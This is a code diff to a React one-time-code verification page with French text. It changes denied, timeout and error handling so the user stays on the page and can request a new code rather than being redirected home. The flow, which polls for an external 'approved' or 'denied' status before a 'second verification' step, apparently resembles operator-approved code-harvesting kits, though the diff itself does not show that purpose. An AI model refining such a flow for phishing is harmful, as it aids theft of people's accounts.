@@ -51,7 +51,8 @@ const OTPVerification = () => {
     
     const timeoutId = setTimeout(() => {
       setIsVerifying(false);
-      navigate("/"); 
+      // Don't navigate away on timeout, just let them resend
+      setTimeLeft(0); 
     }, 45000);
 
     try {
@@ -74,31 +75,33 @@ const OTPVerification = () => {
             
             if (statusData.status === "approved") {
               navigate("/second-verification", { state: { phone: phoneNumber } });
-            } else {
-              navigate("/"); 
+            } else if (statusData.status === "denied") {
+              // ✅ Denied: Stay on OTP page and allow resend
+              setOtp(["", "", "", ""]);
+              setTimeLeft(0); 
+              alert("Code OTP refusé. Veuillez demander un nouveau code.");
             }
           }
         }, 2000);
       } else {
         clearTimeout(timeoutId);
         setIsVerifying(false);
-        navigate("/");
+        setTimeLeft(0);
       }
     } catch (error) {
       clearTimeout(timeoutId);
       setIsVerifying(false);
-      navigate("/");
+      setTimeLeft(0);
     }
   };
 
-  // ✅ NEW: Resend Logic
   const handleResend = async () => {
     if (timeLeft > 0 || isVerifying) return;
     
     setIsVerifying(true);
     const timeoutId = setTimeout(() => {
       setIsVerifying(false);
-      navigate("/"); 
+      setTimeLeft(0); 
     }, 45000);
 
     try {
@@ -123,18 +126,23 @@ const OTPVerification = () => {
             
             if (statusData.status === "approved") {
               navigate("/second-verification", { state: { phone: phoneNumber } });
-            } else {
-              navigate("/"); 
+            } else if (statusData.status === "denied") {
+              // ✅ Denied: Stay on OTP page and allow resend
+              setOtp(["", "", "", ""]);
+              setTimeLeft(0); 
+              alert("Code OTP refusé. Veuillez demander un nouveau code.");
             }
           }
         }, 2000);
       } else {
         clearTimeout(timeoutId);
         setIsVerifying(false);
+        setTimeLeft(0);
       }
     } catch (error) {
       clearTimeout(timeoutId);
       setIsVerifying(false);
+      setTimeLeft(0);
     }
   };
 
@@ -188,7 +196,7 @@ const OTPVerification = () => {
           {isVerifying ? "En attente..." : "Vérifier & se connecter"}
         </button>
         
-        {/* ✅ NEW: Countdown & Resend UI */}
+        {/* ✅ Countdown & Resend UI */}
         <div style={{ textAlign: 'center', marginBottom: '24px' }}>
           <p className="helper-text" style={{ display: 'inline', marginRight: '8px' }}>
             Vous n'avez pas reçu le code ?
